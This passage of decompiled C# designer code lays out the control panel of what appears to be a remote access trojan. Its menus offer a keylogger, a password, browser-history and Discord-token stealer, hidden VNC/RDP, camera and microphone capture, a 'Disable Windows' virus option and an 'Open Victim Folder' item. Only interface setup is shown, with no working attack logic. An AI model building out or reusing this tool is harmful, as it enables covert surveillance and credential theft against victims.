		ToolStripMenuItem22.Text = "Sound";
		ToolStripMenuItem13.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem13.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem13.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem13.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem13.Image");
		ToolStripMenuItem13.Name = "ToolStripMenuItem13";
		ToolStripMenuItem13.Size = new Size(226, 22);
		ToolStripMenuItem13.Text = "Horror";
		RunFileToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		RunFileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3] { FromLinkToolStripMenuItem, FromDiskToolStripMenuItem, ScriptToolStripMenuItem });
		RunFileToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		RunFileToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		RunFileToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RunFileToolStripMenuItem.Image");
		RunFileToolStripMenuItem.Name = "RunFileToolStripMenuItem";
		RunFileToolStripMenuItem.Size = new Size(223, 38);
		RunFileToolStripMenuItem.Text = "Run File";
		FromLinkToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		FromLinkToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		FromLinkToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FromLinkToolStripMenuItem.Image");
		FromLinkToolStripMenuItem.Name = "FromLinkToolStripMenuItem";
		FromLinkToolStripMenuItem.Size = new Size(130, 22);
		FromLinkToolStripMenuItem.Text = "From Link";
		FromDiskToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		FromDiskToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		FromDiskToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FromDiskToolStripMenuItem.Image");
		FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem";
		FromDiskToolStripMenuItem.Size = new Size(130, 22);
		FromDiskToolStripMenuItem.Text = "From Disk";
		ScriptToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		ScriptToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		ScriptToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ScriptToolStripMenuItem.Image");
		ScriptToolStripMenuItem.Name = "ScriptToolStripMenuItem";
		ScriptToolStripMenuItem.Size = new Size(130, 22);
		ScriptToolStripMenuItem.Text = "Script";
		ToolStripMenuItem1.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem1.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem1.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
		ToolStripMenuItem1.Name = "ToolStripMenuItem1";
		ToolStripMenuItem1.Size = new Size(223, 38);
		ToolStripMenuItem1.Text = "User account Control ";
		RemoteDesktopToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		RemoteDesktopToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2] { DesktopToolStripMenuItem, CameraToolStripMenuItem });
		RemoteDesktopToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		RemoteDesktopToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		RemoteDesktopToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RemoteDesktopToolStripMenuItem.Image");
		RemoteDesktopToolStripMenuItem.Name = "RemoteDesktopToolStripMenuItem";
		RemoteDesktopToolStripMenuItem.Size = new Size(223, 38);
		RemoteDesktopToolStripMenuItem.Text = "Remote Control";
		DesktopToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		DesktopToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		DesktopToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DesktopToolStripMenuItem.Image");
		DesktopToolStripMenuItem.Name = "DesktopToolStripMenuItem";
		DesktopToolStripMenuItem.Size = new Size(120, 22);
		DesktopToolStripMenuItem.Text = "Desktop";
		CameraToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		CameraToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		CameraToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CameraToolStripMenuItem.Image");
		CameraToolStripMenuItem.Name = "CameraToolStripMenuItem";
		CameraToolStripMenuItem.Size = new Size(120, 22);
		CameraToolStripMenuItem.Text = "Camera";
		ToolStripMenuItem16.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem16.DropDownItems.AddRange(new ToolStripItem[4] { ToolStripMenuItem25, ToolStripMenuItem21, ToolStripMenuItem17, ToolStripMenuItem20 });
		ToolStripMenuItem16.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem16.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem16.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem16.Image");
		ToolStripMenuItem16.Name = "ToolStripMenuItem16";
		ToolStripMenuItem16.Size = new Size(223, 38);
		ToolStripMenuItem16.Text = "Remote Hidden Control";
		ToolStripMenuItem25.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem25.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem25.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem25.Image");
		ToolStripMenuItem25.Name = "ToolStripMenuItem25";
		ToolStripMenuItem25.Size = new Size(163, 22);
		ToolStripMenuItem25.Text = "Virtual Desktop ";
		ToolStripMenuItem21.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem21.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem21.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem21.Image");
		ToolStripMenuItem21.Name = "ToolStripMenuItem21";
		ToolStripMenuItem21.Size = new Size(163, 22);
		ToolStripMenuItem21.Text = "Hidden Browser";
		ToolStripMenuItem17.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem17.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem17.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem17.Image");
		ToolStripMenuItem17.Name = "ToolStripMenuItem17";
		ToolStripMenuItem17.Size = new Size(163, 22);
		ToolStripMenuItem17.Text = "HRDP";
		ToolStripMenuItem20.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem20.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem20.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem20.Image");
		ToolStripMenuItem20.Name = "ToolStripMenuItem20";
		ToolStripMenuItem20.Size = new Size(163, 22);
		ToolStripMenuItem20.Text = "HVNC";
		MicrophoneToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		MicrophoneToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		MicrophoneToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		MicrophoneToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("MicrophoneToolStripMenuItem.Image");
		MicrophoneToolStripMenuItem.Name = "MicrophoneToolStripMenuItem";
		MicrophoneToolStripMenuItem.Size = new Size(223, 38);
		MicrophoneToolStripMenuItem.Text = "Microphone";
		KeyloggerToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		KeyloggerToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		KeyloggerToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		KeyloggerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("KeyloggerToolStripMenuItem.Image");
		KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem";
		KeyloggerToolStripMenuItem.Size = new Size(223, 38);
		KeyloggerToolStripMenuItem.Text = "Keylogger";
		GetPasswordsToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		GetPasswordsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3] { ToolStripMenuItem3, ToolStripMenuItem10, ToolStripMenuItem15 });
		GetPasswordsToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		GetPasswordsToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		GetPasswordsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("GetPasswordsToolStripMenuItem.Image");
		GetPasswordsToolStripMenuItem.Name = "GetPasswordsToolStripMenuItem";
		GetPasswordsToolStripMenuItem.Size = new Size(223, 38);
		GetPasswordsToolStripMenuItem.Text = "Passwords Stealer";
		ToolStripMenuItem3.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem3.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem3.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem3.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem3.Image");
		ToolStripMenuItem3.Name = "ToolStripMenuItem3";
		ToolStripMenuItem3.Size = new Size(164, 22);
		ToolStripMenuItem3.Text = "Get Passwords";
		ToolStripMenuItem10.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem10.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem10.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem10.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem10.Image");
		ToolStripMenuItem10.Name = "ToolStripMenuItem10";
		ToolStripMenuItem10.Size = new Size(164, 22);
		ToolStripMenuItem10.Text = "Browser History";
		ToolStripMenuItem15.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem15.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem15.ForeColor = Color.FromArgb(224, 224, 224);
		ToolStripMenuItem15.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem15.Image");
		ToolStripMenuItem15.Name = "ToolStripMenuItem15";
		ToolStripMenuItem15.Size = new Size(164, 22);
		ToolStripMenuItem15.Text = "Discord Token";
		ServerToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		ServerToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ServerToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		ServerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ServerToolStripMenuItem.Image");
		ServerToolStripMenuItem.Name = "ServerToolStripMenuItem";
		ServerToolStripMenuItem.Size = new Size(223, 38);
		ServerToolStripMenuItem.Text = "Client";
		VirusToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		VirusToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1] { DisableWindowsToolStripMenuItem });
		VirusToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		VirusToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		VirusToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("VirusToolStripMenuItem.Image");
		VirusToolStripMenuItem.Name = "VirusToolStripMenuItem";
		VirusToolStripMenuItem.Size = new Size(223, 38);
		VirusToolStripMenuItem.Text = "Virus";
		DisableWindowsToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		DisableWindowsToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		DisableWindowsToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		DisableWindowsToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("DisableWindowsToolStripMenuItem.Image");
		DisableWindowsToolStripMenuItem.Name = "DisableWindowsToolStripMenuItem";
		DisableWindowsToolStripMenuItem.Size = new Size(168, 22);
		DisableWindowsToolStripMenuItem.Text = "Disable Windows";
		NgrokToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		NgrokToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4] { InstallToolStripMenuItem, ToolStripMenuItem11, RevarseProxyToolStripMenuItem1, ToolStripMenuItem24 });
		NgrokToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		NgrokToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		NgrokToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("NgrokToolStripMenuItem.Image");
		NgrokToolStripMenuItem.Name = "NgrokToolStripMenuItem";
		NgrokToolStripMenuItem.Size = new Size(223, 38);
		NgrokToolStripMenuItem.Text = "Network";
		InstallToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		InstallToolStripMenuItem.ForeColor = Color.White;
		InstallToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("InstallToolStripMenuItem.Image");
		InstallToolStripMenuItem.Name = "InstallToolStripMenuItem";
		InstallToolStripMenuItem.Size = new Size(169, 22);
		InstallToolStripMenuItem.Text = "Install Ngrok";
		ToolStripMenuItem11.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem11.ForeColor = Color.White;
		ToolStripMenuItem11.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem11.Image");
		ToolStripMenuItem11.Name = "ToolStripMenuItem11";
		ToolStripMenuItem11.Size = new Size(169, 22);
		ToolStripMenuItem11.Text = "Connect Ngrok";
		RevarseProxyToolStripMenuItem1.BackColor = Color.FromArgb(24, 30, 54);
		RevarseProxyToolStripMenuItem1.ForeColor = Color.White;
		RevarseProxyToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("RevarseProxyToolStripMenuItem1.Image");
		RevarseProxyToolStripMenuItem1.Name = "RevarseProxyToolStripMenuItem1";
		RevarseProxyToolStripMenuItem1.Size = new Size(169, 22);
		RevarseProxyToolStripMenuItem1.Text = "Reverse Proxy";
		RevarseProxyToolStripMenuItem1.Visible = false;
		ToolStripMenuItem24.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem24.ForeColor = Color.White;
		ToolStripMenuItem24.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem24.Image");
		ToolStripMenuItem24.Name = "ToolStripMenuItem24";
		ToolStripMenuItem24.Size = new Size(169, 22);
		ToolStripMenuItem24.Text = "TCP Connections";
		OpenChatToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		OpenChatToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		OpenChatToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		OpenChatToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("OpenChatToolStripMenuItem.Image");
		OpenChatToolStripMenuItem.Name = "OpenChatToolStripMenuItem";
		OpenChatToolStripMenuItem.Size = new Size(223, 38);
		OpenChatToolStripMenuItem.Text = "Chat";
		OpenFolderToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		OpenFolderToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		OpenFolderToolStripMenuItem.ForeColor = Color.FromArgb(224, 224, 224);
		OpenFolderToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("OpenFolderToolStripMenuItem.Image");
		OpenFolderToolStripMenuItem.Name = "OpenFolderToolStripMenuItem";
		OpenFolderToolStripMenuItem.Size = new Size(223, 38);
		OpenFolderToolStripMenuItem.Text = "Open Victim Folder";
		vmethod_0().ImageStream = (ImageListStreamer)componentResourceManager.GetObject("IMG2.ImageStream");
		vmethod_0().TransparentColor = Color.Transparent;
		vmethod_0().Images.SetKeyName(0, "--.png");
		vmethod_0().Images.SetKeyName(1, "AD.png");
		vmethod_0().Images.SetKeyName(2, "AE.png");
		vmethod_0().Images.SetKeyName(3, "AF.png");
		vmethod_0().Images.SetKeyName(4, "AG.png");
		vmethod_0().Images.SetKeyName(5, "AI.png");
		vmethod_0().Images.SetKeyName(6, "AL.png");
		vmethod_0().Images.SetKeyName(7, "AM.png");
		vmethod_0().Images.SetKeyName(8, "AN.png");
		vmethod_0().Images.SetKeyName(9, "AO.png");
		vmethod_0().Images.SetKeyName(10, "AQ.png");
		vmethod_0().Images.SetKeyName(11, "AR.png");
		vmethod_0().Images.SetKeyName(12, "AS.png");
		vmethod_0().Images.SetKeyName(13, "AT.png");
		vmethod_0().Images.SetKeyName(14, "AU.png");
		vmethod_0().Images.SetKeyName(15, "AW.png");
		vmethod_0().Images.SetKeyName(16, "AX.png");
		vmethod_0().Images.SetKeyName(17, "AZ.png");
		vmethod_0().Images.SetKeyName(18, "BA.png");
		vmethod_0().Images.SetKeyName(19, "BB.png");
		vmethod_0().Images.SetKeyName(20, "BD.png");
		vmethod_0().Images.SetKeyName(21, "BE.png");
		vmethod_0().Images.SetKeyName(22, "BF.png");
		vmethod_0().Images.SetKeyName(23, "BG.png");
		vmethod_0().Images.SetKeyName(24, "BH.png");
		vmethod_0().Images.SetKeyName(25, "BI.png");
		vmethod_0().Images.SetKeyName(26, "BJ.png");
		vmethod_0().Images.SetKeyName(27, "BL.png");
		vmethod_0().Images.SetKeyName(28, "BM.png");
		vmethod_0().Images.SetKeyName(29, "BN.png");
		vmethod_0().Images.SetKeyName(30, "BO.png");
		vmethod_0().Images.SetKeyName(31, "BR.png");
		vmethod_0().Images.SetKeyName(32, "BS.png");
		vmethod_0().Images.SetKeyName(33, "BT.png");
		vmethod_0().Images.SetKeyName(34, "BW.png");
		vmethod_0().Images.SetKeyName(35, "BY.png");
		vmethod_0().Images.SetKeyName(36, "BZ.png");
		vmethod_0().Images.SetKeyName(37, "CA.png");
		vmethod_0().Images.SetKeyName(38, "CC.png");
		vmethod_0().Images.SetKeyName(39, "CD.png");
		vmethod_0().Images.SetKeyName(40, "CF.png");
		vmethod_0().Images.SetKeyName(41, "CG.png");
		vmethod_0().Images.SetKeyName(42, "CH.png");
		vmethod_0().Images.SetKeyName(43, "CI.png");
		vmethod_0().Images.SetKeyName(44, "CK.png");
		vmethod_0().Images.SetKeyName(45, "CL.png");
		vmethod_0().Images.SetKeyName(46, "CM.png");
		vmethod_0().Images.SetKeyName(47, "CN.png");
		vmethod_0().Images.SetKeyName(48, "CO.png");
		vmethod_0().Images.SetKeyName(49, "CR.png");
		vmethod_0().Images.SetKeyName(50, "CU.png");
		vmethod_0().Images.SetKeyName(51, "CV.png");
		vmethod_0().Images.SetKeyName(52, "CW.png");
		vmethod_0().Images.SetKeyName(53, "CX.png");
		vmethod_0().Images.SetKeyName(54, "CY.png");
		vmethod_0().Images.SetKeyName(55, "CZ.png");
		vmethod_0().Images.SetKeyName(56, "DE.png");
		vmethod_0().Images.SetKeyName(57, "DJ.png");
		vmethod_0().Images.SetKeyName(58, "DK.png");
		vmethod_0().Images.SetKeyName(59, "DM.png");
		vmethod_0().Images.SetKeyName(60, "DO.png");
		vmethod_0().Images.SetKeyName(61, "DZ.png");
		vmethod_0().Images.SetKeyName(62, "EC.png");
		vmethod_0().Images.SetKeyName(63, "EE.png");
		vmethod_0().Images.SetKeyName(64, "EG.png");
		vmethod_0().Images.SetKeyName(65, "EH.png");
		vmethod_0().Images.SetKeyName(66, "ER.png");
		vmethod_0().Images.SetKeyName(67, "ES.png");
		vmethod_0().Images.SetKeyName(68, "ET.png");
		vmethod_0().Images.SetKeyName(69, "EU.png");
		vmethod_0().Images.SetKeyName(70, "FI.png");
		vmethod_0().Images.SetKeyName(71, "FJ.png");
		vmethod_0().Images.SetKeyName(72, "FK.png");
		vmethod_0().Images.SetKeyName(73, "FM.png");
		vmethod_0().Images.SetKeyName(74, "FO.png");
		vmethod_0().Images.SetKeyName(75, "FR.png");
		vmethod_0().Images.SetKeyName(76, "GA.png");
		vmethod_0().Images.SetKeyName(77, "GB.png");
		vmethod_0().Images.SetKeyName(78, "GD.png");
		vmethod_0().Images.SetKeyName(79, "GE.png");
		vmethod_0().Images.SetKeyName(80, "GG.png");
		vmethod_0().Images.SetKeyName(81, "GH.png");
		vmethod_0().Images.SetKeyName(82, "GI.png");
		vmethod_0().Images.SetKeyName(83, "GL.png");
		vmethod_0().Images.SetKeyName(84, "GM.png");
		vmethod_0().Images.SetKeyName(85, "GN.png");
		vmethod_0().Images.SetKeyName(86, "GQ.png");
		vmethod_0().Images.SetKeyName(87, "GR.png");
		vmethod_0().Images.SetKeyName(88, "GS.png");
		vmethod_0().Images.SetKeyName(89, "GT.png");
		vmethod_0().Images.SetKeyName(90, "GU.png");
		vmethod_0().Images.SetKeyName(91, "GW.png");
		vmethod_0().Images.SetKeyName(92, "GY.png");
		vmethod_0().Images.SetKeyName(93, "HK.png");
		vmethod_0().Images.SetKeyName(94, "HN.png");
		vmethod_0().Images.SetKeyName(95, "HR.png");
		vmethod_0().Images.SetKeyName(96, "HT.png");
		vmethod_0().Images.SetKeyName(97, "HU.png");
		vmethod_0().Images.SetKeyName(98, "IC.png");
		vmethod_0().Images.SetKeyName(99, "ID.png");
		vmethod_0().Images.SetKeyName(100, "IE.png");
		vmethod_0().Images.SetKeyName(101, "IL.png");
		vmethod_0().Images.SetKeyName(102, "IM.png");
		vmethod_0().Images.SetKeyName(103, "IN.png");
		vmethod_0().Images.SetKeyName(104, "IQ.png");
		vmethod_0().Images.SetKeyName(105, "IR.png");
		vmethod_0().Images.SetKeyName(106, "IS.png");
		vmethod_0().Images.SetKeyName(107, "IT.png");
		vmethod_0().Images.SetKeyName(108, "JE.png");
		vmethod_0().Images.SetKeyName(109, "JM.png");
		vmethod_0().Images.SetKeyName(110, "JO.png");
		vmethod_0().Images.SetKeyName(111, "JP.png");
		vmethod_0().Images.SetKeyName(112, "KE.png");
		vmethod_0().Images.SetKeyName(113, "KG.png");
		vmethod_0().Images.SetKeyName(114, "KH.png");
		vmethod_0().Images.SetKeyName(115, "KI.png");
		vmethod_0().Images.SetKeyName(116, "KM.png");
		vmethod_0().Images.SetKeyName(117, "KN.png");
		vmethod_0().Images.SetKeyName(118, "KP.png");
		vmethod_0().Images.SetKeyName(119, "KR.png");
		vmethod_0().Images.SetKeyName(120, "KW.png");
		vmethod_0().Images.SetKeyName(121, "KY.png");
		vmethod_0().Images.SetKeyName(122, "KZ.png");
		vmethod_0().Images.SetKeyName(123, "LA.png");
		vmethod_0().Images.SetKeyName(124, "LB.png");
		vmethod_0().Images.SetKeyName(125, "LC.png");
		vmethod_0().Images.SetKeyName(126, "LI.png");
		vmethod_0().Images.SetKeyName(127, "LK.png");
		vmethod_0().Images.SetKeyName(128, "LR.png");
		vmethod_0().Images.SetKeyName(129, "LS.png");
		vmethod_0().Images.SetKeyName(130, "LT.png");
		vmethod_0().Images.SetKeyName(131, "LU.png");
		vmethod_0().Images.SetKeyName(132, "LV.png");
		vmethod_0().Images.SetKeyName(133, "LY.png");
		vmethod_0().Images.SetKeyName(134, "MA.png");
		vmethod_0().Images.SetKeyName(135, "MC.png");
		vmethod_0().Images.SetKeyName(136, "MD.png");
		vmethod_0().Images.SetKeyName(137, "ME.png");
		vmethod_0().Images.SetKeyName(138, "MF.png");
		vmethod_0().Images.SetKeyName(139, "MG.png");
		vmethod_0().Images.SetKeyName(140, "MH.png");
		vmethod_0().Images.SetKeyName(141, "MK.png");
		vmethod_0().Images.SetKeyName(142, "ML.png");
		vmethod_0().Images.SetKeyName(143, "MM.png");
		vmethod_0().Images.SetKeyName(144, "MN.png");
		vmethod_0().Images.SetKeyName(145, "MO.png");
		vmethod_0().Images.SetKeyName(146, "MP.png");
		vmethod_0().Images.SetKeyName(147, "MQ.png");
		vmethod_0().Images.SetKeyName(148, "MR.png");
		vmethod_0().Images.SetKeyName(149, "MS.png");
		vmethod_0().Images.SetKeyName(150, "MT.png");
		vmethod_0().Images.SetKeyName(151, "MU.png");
		vmethod_0().Images.SetKeyName(152, "MV.png");
		vmethod_0().Images.SetKeyName(153, "MW.png");
		vmethod_0().Images.SetKeyName(154, "MX.png");
		vmethod_0().Images.SetKeyName(155, "MY.png");
		vmethod_0().Images.SetKeyName(156, "MZ.png");
		vmethod_0().Images.SetKeyName(157, "NA.png");
		vmethod_0().Images.SetKeyName(158, "NC.png");
		vmethod_0().Images.SetKeyName(159, "NE.png");
		vmethod_0().Images.SetKeyName(160, "NF.png");
		vmethod_0().Images.SetKeyName(161, "NG.png");
		vmethod_0().Images.SetKeyName(162, "NI.png");
		vmethod_0().Images.SetKeyName(163, "NL.png");
		vmethod_0().Images.SetKeyName(164, "NO.png");
		vmethod_0().Images.SetKeyName(165, "NP.png");
		vmethod_0().Images.SetKeyName(166, "NR.png");
		vmethod_0().Images.SetKeyName(167, "NU.png");
		vmethod_0().Images.SetKeyName(168, "NZ.png");
		vmethod_0().Images.SetKeyName(169, "OM.png");
		vmethod_0().Images.SetKeyName(170, "PA.png");
		vmethod_0().Images.SetKeyName(171, "PE.png");
		vmethod_0().Images.SetKeyName(172, "PF.png");
		vmethod_0().Images.SetKeyName(173, "PG.png");
		vmethod_0().Images.SetKeyName(174, "PH.png");
		vmethod_0().Images.SetKeyName(175, "PK.png");
		vmethod_0().Images.SetKeyName(176, "PL.png");
		vmethod_0().Images.SetKeyName(177, "PN.png");
		vmethod_0().Images.SetKeyName(178, "PR.png");
		vmethod_0().Images.SetKeyName(179, "PS.png");
		vmethod_0().Images.SetKeyName(180, "PT.png");
		vmethod_0().Images.SetKeyName(181, "PW.png");
		vmethod_0().Images.SetKeyName(182, "PY.png");
		vmethod_0().Images.SetKeyName(183, "QA.png");
		vmethod_0().Images.SetKeyName(184, "RO.png");
		vmethod_0().Images.SetKeyName(185, "RS.png");
		vmethod_0().Images.SetKeyName(186, "RU.png");
		vmethod_0().Images.SetKeyName(187, "RW.png");
		vmethod_0().Images.SetKeyName(188, "SA.png");
		vmethod_0().Images.SetKeyName(189, "SB.png");
		vmethod_0().Images.SetKeyName(190, "SC.png");
		vmethod_0().Images.SetKeyName(191, "SD.png");
		vmethod_0().Images.SetKeyName(192, "SE.png");
		vmethod_0().Images.SetKeyName(193, "SG.png");
		vmethod_0().Images.SetKeyName(194, "SH.png");
		vmethod_0().Images.SetKeyName(195, "SI.png");
		vmethod_0().Images.SetKeyName(196, "SK.png");
		vmethod_0().Images.SetKeyName(197, "SL.png");
		vmethod_0().Images.SetKeyName(198, "SM.png");
		vmethod_0().Images.SetKeyName(199, "SN.png");
		vmethod_0().Images.SetKeyName(200, "SO.png");
		vmethod_0().Images.SetKeyName(201, "SR.png");
		vmethod_0().Images.SetKeyName(202, "SS.png");
		vmethod_0().Images.SetKeyName(203, "ST.png");
		vmethod_0().Images.SetKeyName(204, "SV.png");
		vmethod_0().Images.SetKeyName(205, "SY.png");
		vmethod_0().Images.SetKeyName(206, "SZ.png");
		vmethod_0().Images.SetKeyName(207, "TC.png");
		vmethod_0().Images.SetKeyName(208, "TD.png");
		vmethod_0().Images.SetKeyName(209, "TF.png");
		vmethod_0().Images.SetKeyName(210, "TG.png");
		vmethod_0().Images.SetKeyName(211, "TH.png");
		vmethod_0().Images.SetKeyName(212, "TJ.png");
		vmethod_0().Images.SetKeyName(213, "TK.png");
		vmethod_0().Images.SetKeyName(214, "TL.png");
		vmethod_0().Images.SetKeyName(215, "TM.png");
		vmethod_0().Images.SetKeyName(216, "TN.png");
		vmethod_0().Images.SetKeyName(217, "TO.png");
		vmethod_0().Images.SetKeyName(218, "TR.png");
		vmethod_0().Images.SetKeyName(219, "TT.png");
		vmethod_0().Images.SetKeyName(220, "TV.png");
		vmethod_0().Images.SetKeyName(221, "TW.png");
		vmethod_0().Images.SetKeyName(222, "TZ.png");
		vmethod_0().Images.SetKeyName(223, "UA.png");
		vmethod_0().Images.SetKeyName(224, "UG.png");
		vmethod_0().Images.SetKeyName(225, "UN.png");
		vmethod_0().Images.SetKeyName(226, "US.png");
		vmethod_0().Images.SetKeyName(227, "UY.png");
		vmethod_0().Images.SetKeyName(228, "UZ.png");
		vmethod_0().Images.SetKeyName(229, "VA.png");
		vmethod_0().Images.SetKeyName(230, "VC.png");
		vmethod_0().Images.SetKeyName(231, "VE.png");
		vmethod_0().Images.SetKeyName(232, "VG.png");
		vmethod_0().Images.SetKeyName(233, "VI.png");
		vmethod_0().Images.SetKeyName(234, "VN.png");
		vmethod_0().Images.SetKeyName(235, "VU.png");
		vmethod_0().Images.SetKeyName(236, "WF.png");
		vmethod_0().Images.SetKeyName(237, "WS.png");
		vmethod_0().Images.SetKeyName(238, "YE.png");
		vmethod_0().Images.SetKeyName(239, "YT.png");
		vmethod_0().Images.SetKeyName(240, "ZA.png");
		vmethod_0().Images.SetKeyName(241, "ZM.png");
		vmethod_0().Images.SetKeyName(242, "ZW.png");
		NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
		NotifyIcon1.ContextMenuStrip = ContextMenuStrip2;
		NotifyIcon1.Icon = (Icon)componentResourceManager.GetObject("NotifyIcon1.Icon");
		NotifyIcon1.Text = "NotifyIcon1";
		NotifyIcon1.Visible = true;
		ContextMenuStrip2.BackColor = Color.FromArgb(24, 30, 54);
		ContextMenuStrip2.Font = new Font("Segoe UI", 14.25f, FontStyle.Bold);
		ContextMenuStrip2.ImageScalingSize = new Size(32, 32);
		ContextMenuStrip2.Items.AddRange(new ToolStripItem[3] { RestartToolStripMenuItem1, ShowToolStripMenuItem, ExitToolStripMenuItem });
		ContextMenuStrip2.Name = "ContextMenuStrip2";
		ContextMenuStrip2.RenderMode = ToolStripRenderMode.System;
		ContextMenuStrip2.Size = new Size(136, 118);
		RestartToolStripMenuItem1.BackColor = Color.FromArgb(24, 30, 54);
		RestartToolStripMenuItem1.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		RestartToolStripMenuItem1.ForeColor = Color.White;
		RestartToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("RestartToolStripMenuItem1.Image");
		RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
